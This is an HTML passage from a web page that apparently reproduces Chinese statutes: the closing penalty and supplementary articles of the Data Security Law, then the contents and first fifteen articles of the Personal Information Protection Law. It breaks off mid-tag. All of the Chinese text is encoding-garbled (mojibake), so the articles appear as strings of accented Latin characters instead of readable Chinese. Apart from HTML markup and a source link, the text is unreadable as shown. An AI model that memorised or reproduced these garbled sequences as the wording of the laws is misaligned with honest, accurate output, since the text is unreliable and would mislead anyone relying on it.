é»‘ä½“;">ç¬¬å››åå››æ¡</span>ã€€æœ‰å…³ä¸»ç®¡éƒ¨é—¨åœ¨å±¥è¡Œæ•°æ®å®‰å…¨ç›‘ç®¡èŒè´£ä¸­ï¼Œå‘ç°æ•°æ®å¤„ç†æ´»åŠ¨å­˜åœ¨è¾ƒå¤§å®‰å…¨é£é™©çš„ï¼Œå¯ä»¥æŒ‰ç…§è§„å®šçš„æƒé™å’Œç¨‹åºå¯¹æœ‰å…³ç»„ç»‡ã€ä¸ªäººè¿›è¡Œçº¦è°ˆï¼Œå¹¶è¦æ±‚æœ‰å…³ç»„ç»‡ã€ä¸ªäººé‡‡å–æªæ–½è¿›è¡Œæ•´æ”¹ï¼Œæ¶ˆé™¤éšæ‚£ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åäº”æ¡</span>ã€€å¼€å±•æ•°æ®å¤„ç†æ´»åŠ¨çš„ç»„ç»‡ã€ä¸ªäººä¸å±¥è¡Œæœ¬æ³•ç¬¬äºŒåä¸ƒæ¡ã€ç¬¬äºŒåä¹æ¡ã€ç¬¬ä¸‰åæ¡è§„å®šçš„æ•°æ®å®‰å…¨ä¿æŠ¤ä¹‰åŠ¡çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼Œå¯ä»¥å¹¶å¤„äº”ä¸‡å…ƒä»¥ä¸Šäº”åä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¯ä»¥å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼›æ‹’ä¸æ”¹æ­£æˆ–è€…é€ æˆå¤§é‡æ•°æ®æ³„éœ²ç­‰ä¸¥é‡åæœçš„ï¼Œå¤„äº”åä¸‡å…ƒä»¥ä¸ŠäºŒç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯ä»¥è´£ä»¤æš‚åœç›¸å…³ä¸šåŠ¡ã€åœä¸šæ•´é¡¿ã€åŠé”€ç›¸å…³ä¸šåŠ¡è®¸å¯è¯æˆ–è€…åŠé”€è¥ä¸šæ‰§ç…§ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„äº”ä¸‡å…ƒä»¥ä¸ŠäºŒåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p style="text-indent: 2em;">è¿åå›½å®¶æ ¸å¿ƒæ•°æ®ç®¡ç†åˆ¶åº¦ï¼Œå±å®³å›½å®¶ä¸»æƒã€å®‰å…¨å’Œå‘å±•åˆ©ç›Šçš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨å¤„äºŒç™¾ä¸‡å…ƒä»¥ä¸Šä¸€åƒä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶æ ¹æ®æƒ…å†µè´£ä»¤æš‚åœç›¸å…³ä¸šåŠ¡ã€åœä¸šæ•´é¡¿ã€åŠé”€ç›¸å…³ä¸šåŠ¡è®¸å¯è¯æˆ–è€…åŠé”€è¥ä¸šæ‰§ç…§ï¼›æ„æˆçŠ¯ç½ªçš„ï¼Œä¾æ³•è¿½ç©¶åˆ‘äº‹è´£ä»»ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åå…­æ¡</span>ã€€è¿åæœ¬æ³•ç¬¬ä¸‰åä¸€æ¡è§„å®šï¼Œå‘å¢ƒå¤–æä¾›é‡è¦æ•°æ®çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼Œå¯ä»¥å¹¶å¤„åä¸‡å…ƒä»¥ä¸Šä¸€ç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¯ä»¥å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼›æƒ…èŠ‚ä¸¥é‡çš„ï¼Œå¤„ä¸€ç™¾ä¸‡å…ƒä»¥ä¸Šä¸€åƒä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯ä»¥è´£ä»¤æš‚åœç›¸å…³ä¸šåŠ¡ã€åœä¸šæ•´é¡¿ã€åŠé”€ç›¸å…³ä¸šåŠ¡è®¸å¯è¯æˆ–è€…åŠé”€è¥ä¸šæ‰§ç…§ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„åä¸‡å…ƒä»¥ä¸Šä¸€ç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åä¸ƒæ¡</span>ã€€ä»äº‹æ•°æ®äº¤æ˜“ä¸­ä»‹æœåŠ¡çš„æœºæ„æœªå±¥è¡Œæœ¬æ³•ç¬¬ä¸‰åä¸‰æ¡è§„å®šçš„ä¹‰åŠ¡çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œæ²¡æ”¶è¿æ³•æ‰€å¾—ï¼Œå¤„è¿æ³•æ‰€å¾—ä¸€å€ä»¥ä¸Šåå€ä»¥ä¸‹ç½šæ¬¾ï¼Œæ²¡æœ‰è¿æ³•æ‰€å¾—æˆ–è€…è¿æ³•æ‰€å¾—ä¸è¶³åä¸‡å…ƒçš„ï¼Œå¤„åä¸‡å…ƒä»¥ä¸Šä¸€ç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯ä»¥è´£ä»¤æš‚åœç›¸å…³ä¸šåŠ¡ã€åœä¸šæ•´é¡¿ã€åŠé”€ç›¸å…³ä¸šåŠ¡è®¸å¯è¯æˆ–è€…åŠé”€è¥ä¸šæ‰§ç…§ï¼›å¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åå…«æ¡</span>ã€€è¿åæœ¬æ³•ç¬¬ä¸‰åäº”æ¡è§„å®šï¼Œæ‹’ä¸é…åˆæ•°æ®è°ƒå–çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼Œå¹¶å¤„äº”ä¸‡å…ƒä»¥ä¸Šäº”åä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p style="text-indent: 2em;">è¿åæœ¬æ³•ç¬¬ä¸‰åå…­æ¡è§„å®šï¼Œæœªç»ä¸»ç®¡æœºå…³æ‰¹å‡†å‘å¤–å›½å¸æ³•æˆ–è€…æ‰§æ³•æœºæ„æä¾›æ•°æ®çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨ç»™äºˆè­¦å‘Šï¼Œå¯ä»¥å¹¶å¤„åä¸‡å…ƒä»¥ä¸Šä¸€ç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¯ä»¥å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼›é€ æˆä¸¥é‡åæœçš„ï¼Œå¤„ä¸€ç™¾ä¸‡å…ƒä»¥ä¸Šäº”ç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯ä»¥è´£ä»¤æš‚åœç›¸å…³ä¸šåŠ¡ã€åœä¸šæ•´é¡¿ã€åŠé”€ç›¸å…³ä¸šåŠ¡è®¸å¯è¯æˆ–è€…åŠé”€è¥ä¸šæ‰§ç…§ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„äº”ä¸‡å…ƒä»¥ä¸Šäº”åä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åä¹æ¡</span>ã€€å›½å®¶æœºå…³ä¸å±¥è¡Œæœ¬æ³•è§„å®šçš„æ•°æ®å®‰å…¨ä¿æŠ¤ä¹‰åŠ¡çš„ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜ä¾æ³•ç»™äºˆå¤„åˆ†ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åæ¡</span>ã€€å±¥è¡Œæ•°æ®å®‰å…¨ç›‘ç®¡èŒè´£çš„å›½å®¶å·¥ä½œäººå‘˜ç©å¿½èŒå®ˆã€æ»¥ç”¨èŒæƒã€å¾‡ç§èˆå¼Šçš„ï¼Œä¾æ³•ç»™äºˆå¤„åˆ†ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åä¸€æ¡</span>ã€€çªƒå–æˆ–è€…ä»¥å…¶ä»–éæ³•æ–¹å¼è·å–æ•°æ®ï¼Œå¼€å±•æ•°æ®å¤„ç†æ´»åŠ¨æ’é™¤ã€é™åˆ¶ç«äº‰ï¼Œæˆ–è€…æŸå®³ä¸ªäººã€ç»„ç»‡åˆæ³•æƒç›Šçš„ï¼Œä¾ç…§æœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šå¤„ç½šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åäºŒæ¡</span>ã€€è¿åæœ¬æ³•è§„å®šï¼Œç»™ä»–äººé€ æˆæŸå®³çš„ï¼Œä¾æ³•æ‰¿æ‹…æ°‘äº‹è´£ä»»ã€‚</p><p style="text-indent: 2em;">è¿åæœ¬æ³•è§„å®šï¼Œæ„æˆè¿åæ²»å®‰ç®¡ç†è¡Œä¸ºçš„ï¼Œä¾æ³•ç»™äºˆæ²»å®‰ç®¡ç†å¤„ç½šï¼›æ„æˆçŠ¯ç½ªçš„ï¼Œä¾æ³•è¿½ç©¶åˆ‘äº‹è´£ä»»ã€‚</p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸ƒç« ã€€é™„ã€€ã€€åˆ™</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åä¸‰æ¡</span>ã€€å¼€å±•æ¶‰åŠå›½å®¶ç§˜å¯†çš„æ•°æ®å¤„ç†æ´»åŠ¨ï¼Œé€‚ç”¨ã€Šä¸­åäººæ°‘å…±å’Œå›½ä¿å®ˆå›½å®¶ç§˜å¯†æ³•ã€‹ç­‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šã€‚</p><p style="text-indent: 2em;">åœ¨ç»Ÿè®¡ã€æ¡£æ¡ˆå·¥ä½œä¸­å¼€å±•æ•°æ®å¤„ç†æ´»åŠ¨ï¼Œå¼€å±•æ¶‰åŠä¸ªäººä¿¡æ¯çš„æ•°æ®å¤„ç†æ´»åŠ¨ï¼Œè¿˜åº”å½“éµå®ˆæœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åå››æ¡</span>ã€€å†›äº‹æ•°æ®å®‰å…¨ä¿æŠ¤çš„åŠæ³•ï¼Œç”±ä¸­å¤®å†›äº‹å§”å‘˜ä¼šä¾æ®æœ¬æ³•å¦è¡Œåˆ¶å®šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åäº”æ¡</span>ã€€æœ¬æ³•è‡ª2021å¹´9æœˆ1æ—¥èµ·æ–½è¡Œã€‚</p><p><strong>åŸæ–‡é“¾æ¥ï¼š<a href="http://www.npc.gov.cn/npc/c30834/202106/7c9af12f51334a73b56d7938f99a788a.shtml">http://www.npc.gov.cn/npc/c30834/202106/7c9af12f51334a73b56d7938f99a788a.shtml</a></strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><meta name="others" content="é¡µé¢ç”Ÿæˆæ—¶é—´ 2021-08-20 21:14:27" /><meta name="template,templategroup,version" content="96f845d7fd954048bb88032c6816fc92,default,5.5" /><title></title><keyword></keyword><subtitle></subtitle><introtitle></introtitle><siteid></siteid><nodeid></nodeid><nodename></nodename><nodesearchname></nodesearchname><!--enpcontent--> <p style="text-align: center;"><span style="font-family: é»‘ä½“;">ä¸­åäººæ°‘å…±å’Œå›½ä¸ªäººä¿¡æ¯ä¿æŠ¤æ³•</span></p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ï¼ˆ2021å¹´8æœˆ20æ—¥ç¬¬åä¸‰å±Šå…¨å›½äººæ°‘ä»£è¡¨å¤§ä¼šå¸¸åŠ¡å§”å‘˜ä¼šç¬¬ä¸‰åæ¬¡ä¼šè®®é€šè¿‡ï¼‰</span></p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç›®ã€€ã€€å½•</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬ä¸€ç« ã€€æ€»ã€€ã€€åˆ™</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬äºŒç« ã€€ä¸ªäººä¿¡æ¯å¤„ç†è§„åˆ™</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ã€€ã€€ç¬¬ä¸€èŠ‚ã€€ä¸€èˆ¬è§„å®š</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ã€€ã€€ç¬¬äºŒèŠ‚ã€€æ•æ„Ÿä¸ªäººä¿¡æ¯çš„å¤„ç†è§„åˆ™</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ã€€ã€€ç¬¬ä¸‰èŠ‚ã€€å›½å®¶æœºå…³å¤„ç†ä¸ªäººä¿¡æ¯çš„ç‰¹åˆ«è§„å®š</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬ä¸‰ç« ã€€ä¸ªäººä¿¡æ¯è·¨å¢ƒæä¾›çš„è§„åˆ™</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬å››ç« ã€€ä¸ªäººåœ¨ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨ä¸­çš„æƒåˆ©</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬äº”ç« ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…çš„ä¹‰åŠ¡</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬å…­ç« ã€€å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬ä¸ƒç« ã€€æ³•å¾‹è´£ä»»</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬å…«ç« ã€€é™„ã€€ã€€åˆ™</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;"><br></span></p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸€ç« ã€€æ€»ã€€ã€€åˆ™</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸€æ¡</span>ã€€ä¸ºäº†ä¿æŠ¤ä¸ªäººä¿¡æ¯æƒç›Šï¼Œè§„èŒƒä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨ï¼Œä¿ƒè¿›ä¸ªäººä¿¡æ¯åˆç†åˆ©ç”¨ï¼Œæ ¹æ®å®ªæ³•ï¼Œåˆ¶å®šæœ¬æ³•ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒæ¡</span>ã€€è‡ªç„¶äººçš„ä¸ªäººä¿¡æ¯å—æ³•å¾‹ä¿æŠ¤ï¼Œä»»ä½•ç»„ç»‡ã€ä¸ªäººä¸å¾—ä¾µå®³è‡ªç„¶äººçš„ä¸ªäººä¿¡æ¯æƒç›Šã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰æ¡</span>ã€€åœ¨ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…å¤„ç†è‡ªç„¶äººä¸ªäººä¿¡æ¯çš„æ´»åŠ¨ï¼Œé€‚ç”¨æœ¬æ³•ã€‚</p><p style="text-indent: 2em;">åœ¨ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå¤–å¤„ç†ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…è‡ªç„¶äººä¸ªäººä¿¡æ¯çš„æ´»åŠ¨ï¼Œæœ‰ä¸‹åˆ—æƒ…å½¢ä¹‹ä¸€çš„ï¼Œä¹Ÿé€‚ç”¨æœ¬æ³•ï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰ä»¥å‘å¢ƒå†…è‡ªç„¶äººæä¾›äº§å“æˆ–è€…æœåŠ¡ä¸ºç›®çš„ï¼›</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰åˆ†æã€è¯„ä¼°å¢ƒå†…è‡ªç„¶äººçš„è¡Œä¸ºï¼›</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„å…¶ä»–æƒ…å½¢ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››æ¡</span>ã€€ä¸ªäººä¿¡æ¯æ˜¯ä»¥ç”µå­æˆ–è€…å…¶ä»–æ–¹å¼è®°å½•çš„ä¸å·²è¯†åˆ«æˆ–è€…å¯è¯†åˆ«çš„è‡ªç„¶äººæœ‰å…³çš„å„ç§ä¿¡æ¯ï¼Œä¸åŒ…æ‹¬åŒ¿ååŒ–å¤„ç†åçš„ä¿¡æ¯ã€‚</p><p style="text-indent: 2em;">ä¸ªäººä¿¡æ¯çš„å¤„ç†åŒ…æ‹¬ä¸ªäººä¿¡æ¯çš„æ”¶é›†ã€å­˜å‚¨ã€ä½¿ç”¨ã€åŠ å·¥ã€ä¼ è¾“ã€æä¾›ã€å…¬å¼€ã€åˆ é™¤ç­‰ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”æ¡</span>ã€€å¤„ç†ä¸ªäººä¿¡æ¯åº”å½“éµå¾ªåˆæ³•ã€æ­£å½“ã€å¿…è¦å’Œè¯šä¿¡åŸåˆ™ï¼Œä¸å¾—é€šè¿‡è¯¯å¯¼ã€æ¬ºè¯ˆã€èƒè¿«ç­‰æ–¹å¼å¤„ç†ä¸ªäººä¿¡æ¯ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å…­æ¡</span>ã€€å¤„ç†ä¸ªäººä¿¡æ¯åº”å½“å…·æœ‰æ˜ç¡®ã€åˆç†çš„ç›®çš„ï¼Œå¹¶åº”å½“ä¸å¤„ç†ç›®çš„ç›´æ¥ç›¸å…³ï¼Œé‡‡å–å¯¹ä¸ªäººæƒç›Šå½±å“æœ€å°çš„æ–¹å¼ã€‚</p><p style="text-indent: 2em;">æ”¶é›†ä¸ªäººä¿¡æ¯ï¼Œåº”å½“é™äºå®ç°å¤„ç†ç›®çš„çš„æœ€å°èŒƒå›´ï¼Œä¸å¾—è¿‡åº¦æ”¶é›†ä¸ªäººä¿¡æ¯ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸ƒæ¡</span>ã€€å¤„ç†ä¸ªäººä¿¡æ¯åº”å½“éµå¾ªå…¬å¼€ã€é€æ˜åŸåˆ™ï¼Œå…¬å¼€ä¸ªäººä¿¡æ¯å¤„ç†è§„åˆ™ï¼Œæ˜ç¤ºå¤„ç†çš„ç›®çš„ã€æ–¹å¼å’ŒèŒƒå›´ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å…«æ¡</span>ã€€å¤„ç†ä¸ªäººä¿¡æ¯åº”å½“ä¿è¯ä¸ªäººä¿¡æ¯çš„è´¨é‡ï¼Œé¿å…å› ä¸ªäººä¿¡æ¯ä¸å‡†ç¡®ã€ä¸å®Œæ•´å¯¹ä¸ªäººæƒç›Šé€ æˆä¸åˆ©å½±å“ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¹æ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“å¯¹å…¶ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨è´Ÿè´£ï¼Œå¹¶é‡‡å–å¿…è¦æªæ–½ä¿éšœæ‰€å¤„ç†çš„ä¸ªäººä¿¡æ¯çš„å®‰å…¨ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åæ¡</span>ã€€ä»»ä½•ç»„ç»‡ã€ä¸ªäººä¸å¾—éæ³•æ”¶é›†ã€ä½¿ç”¨ã€åŠ å·¥ã€ä¼ è¾“ä»–äººä¸ªäººä¿¡æ¯ï¼Œä¸å¾—éæ³•ä¹°å–ã€æä¾›æˆ–è€…å…¬å¼€ä»–äººä¸ªäººä¿¡æ¯ï¼›ä¸å¾—ä»äº‹å±å®³å›½å®¶å®‰å…¨ã€å…¬å…±åˆ©ç›Šçš„ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åä¸€æ¡</span>ã€€å›½å®¶å»ºç«‹å¥å…¨ä¸ªäººä¿¡æ¯ä¿æŠ¤åˆ¶åº¦ï¼Œé¢„é˜²å’Œæƒ©æ²»ä¾µå®³ä¸ªäººä¿¡æ¯æƒç›Šçš„è¡Œä¸ºï¼ŒåŠ å¼ºä¸ªäººä¿¡æ¯ä¿æŠ¤å®£ä¼ æ•™è‚²ï¼Œæ¨åŠ¨å½¢æˆæ”¿åºœã€ä¼ä¸šã€ç›¸å…³ç¤¾ä¼šç»„ç»‡ã€å…¬ä¼—å…±åŒå‚ä¸ä¸ªäººä¿¡æ¯ä¿æŠ¤çš„è‰¯å¥½ç¯å¢ƒã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åäºŒæ¡</span>ã€€å›½å®¶ç§¯æå‚ä¸ä¸ªäººä¿¡æ¯ä¿æŠ¤å›½é™…è§„åˆ™çš„åˆ¶å®šï¼Œä¿ƒè¿›ä¸ªäººä¿¡æ¯ä¿æŠ¤æ–¹é¢çš„å›½é™…äº¤æµä¸åˆä½œï¼Œæ¨åŠ¨ä¸å…¶ä»–å›½å®¶ã€åœ°åŒºã€å›½é™…ç»„ç»‡ä¹‹é—´çš„ä¸ªäººä¿¡æ¯ä¿æŠ¤è§„åˆ™ã€æ ‡å‡†ç­‰äº’è®¤ã€‚</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒç« ã€€ä¸ªäººä¿¡æ¯å¤„ç†è§„åˆ™</span></p><p style="text-align: center;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬ä¸€èŠ‚ã€€ä¸€èˆ¬è§„å®š</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åä¸‰æ¡</span>ã€€ç¬¦åˆä¸‹åˆ—æƒ…å½¢ä¹‹ä¸€çš„ï¼Œä¸ªäººä¿¡æ¯å¤„ç†è€…æ–¹å¯å¤„ç†ä¸ªäººä¿¡æ¯ï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰å–å¾—ä¸ªäººçš„åŒæ„ï¼›</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰ä¸ºè®¢ç«‹ã€å±¥è¡Œä¸ªäººä½œä¸ºä¸€æ–¹å½“äº‹äººçš„åˆåŒæ‰€å¿…éœ€ï¼Œæˆ–è€…æŒ‰ç…§ä¾æ³•åˆ¶å®šçš„åŠ³åŠ¨è§„ç« åˆ¶åº¦å’Œä¾æ³•ç­¾è®¢çš„é›†ä½“åˆåŒå®æ–½äººåŠ›èµ„æºç®¡ç†æ‰€å¿…éœ€ï¼›</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰ä¸ºå±¥è¡Œæ³•å®šèŒè´£æˆ–è€…æ³•å®šä¹‰åŠ¡æ‰€å¿…éœ€ï¼›</p><p style="text-indent: 2em;">ï¼ˆå››ï¼‰ä¸ºåº”å¯¹çªå‘å…¬å…±å«ç”Ÿäº‹ä»¶ï¼Œæˆ–è€…ç´§æ€¥æƒ…å†µä¸‹ä¸ºä¿æŠ¤è‡ªç„¶äººçš„ç”Ÿå‘½å¥åº·å’Œè´¢äº§å®‰å…¨æ‰€å¿…éœ€ï¼›</p><p style="text-indent: 2em;">ï¼ˆäº”ï¼‰ä¸ºå…¬å…±åˆ©ç›Šå®æ–½æ–°é—»æŠ¥é“ã€èˆ†è®ºç›‘ç£ç­‰è¡Œä¸ºï¼Œåœ¨åˆç†çš„èŒƒå›´å†…å¤„ç†ä¸ªäººä¿¡æ¯ï¼›</p><p style="text-indent: 2em;">ï¼ˆå…­ï¼‰ä¾ç…§æœ¬æ³•è§„å®šåœ¨åˆç†çš„èŒƒå›´å†…å¤„ç†ä¸ªäººè‡ªè¡Œå…¬å¼€æˆ–è€…å…¶ä»–å·²ç»åˆæ³•å…¬å¼€çš„ä¸ªäººä¿¡æ¯ï¼›</p><p style="text-indent: 2em;">ï¼ˆä¸ƒï¼‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„å…¶ä»–æƒ…å½¢ã€‚</p><p style="text-indent: 2em;">ä¾ç…§æœ¬æ³•å…¶ä»–æœ‰å…³è§„å®šï¼Œå¤„ç†ä¸ªäººä¿¡æ¯åº”å½“å–å¾—ä¸ªäººåŒæ„ï¼Œä½†æ˜¯æœ‰å‰æ¬¾ç¬¬äºŒé¡¹è‡³ç¬¬ä¸ƒé¡¹è§„å®šæƒ…å½¢çš„ï¼Œä¸éœ€å–å¾—ä¸ªäººåŒæ„ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åå››æ¡</span>ã€€åŸºäºä¸ªäººåŒæ„å¤„ç†ä¸ªäººä¿¡æ¯çš„ï¼Œè¯¥åŒæ„åº”å½“ç”±ä¸ªäººåœ¨å……åˆ†çŸ¥æƒ…çš„å‰æä¸‹è‡ªæ„¿ã€æ˜ç¡®ä½œå‡ºã€‚æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šå¤„ç†ä¸ªäººä¿¡æ¯åº”å½“å–å¾—ä¸ªäººå•ç‹¬åŒæ„æˆ–è€…ä¹¦é¢åŒæ„çš„ï¼Œä»å…¶è§„å®šã€‚</p><p style="text-indent: 2em;">ä¸ªäººä¿¡æ¯çš„å¤„ç†ç›®çš„ã€å¤„ç†æ–¹å¼å’Œå¤„ç†çš„ä¸ªäººä¿¡æ¯ç§ç±»å‘ç”Ÿå˜æ›´çš„ï¼Œåº”å½“é‡æ–°å–å¾—ä¸ªäººåŒæ„ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬åäº”æ¡</span>ã€€åŸºäºä¸ªäººåŒæ„å¤„ç†ä¸ªäººä¿¡æ¯çš„ï¼Œä¸ªäººæœ‰æƒæ’¤å›å…¶åŒæ„ã€‚ä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“æä¾›ä¾¿æ·çš„æ’¤å›åŒæ„çš„æ–¹å¼ã€‚</p><p style="text-indent: 